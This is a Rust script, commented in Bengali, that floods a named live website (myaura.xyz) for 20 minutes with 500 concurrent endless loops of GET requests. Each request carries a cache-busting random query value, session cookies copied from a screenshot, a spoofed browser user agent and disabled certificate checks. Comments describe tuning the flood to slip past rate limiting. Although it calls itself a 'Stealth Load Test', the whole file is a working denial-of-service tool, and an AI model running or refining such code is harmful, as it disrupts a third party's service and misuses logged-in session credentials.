use reqwest::{Client, header};
use std::time::Duration;

#[tokio::main]
async fn main() {
    let target = "https://myaura.xyz/"; 
    
    // তোমার স্ক্রিনশট (image_60ab0a.png) থেকে পাওয়া কুকিগুলো হুবহু এখানে বসাও
    let my_cookie = "__Host-user_session=তোমার_ভ্যালু; user_session=তোমার_ভ্যালু; logged_in=yes"; 

    let mut headers = header::HeaderMap::new();
    headers.insert(header::COOKIE, header::HeaderValue::from_str(my_cookie).unwrap());
    headers.insert(header::USER_AGENT, header::HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"));

    let client = Client::builder()
        .default_headers(headers)
        .use_rustls_tls()
        .danger_accept_invalid_certs(true)
        .build().unwrap();

    println!("🚀 Starting Stealth Load Test...");

    let mut handles = vec![];
    for i in 0..500 { // ৪২৯ এরর কমাতে থ্রেড সংখ্যা কিছুটা কমানো হয়েছে
        let client_ref = client.clone();
        let target_ref = target.to_string();
        handles.push(tokio::spawn(async move {
            loop {
                let url = format!("{}?vortex={}", target_ref, rand::random::<u32>());
                let res = client_ref.get(&url).send().await;
                
                if let Ok(resp) = res {
                    if i == 0 { println!("📡 Status: {}", resp.status()); }
                    if resp.status().as_u16() == 429 {
                        tokio::time::sleep(Duration::from_millis(500)).await; // ৪২৯ আসলে বিরতি
                    }
                }
            }
        }));
    }
    tokio::time::sleep(Duration::from_secs(1200)).await;
}
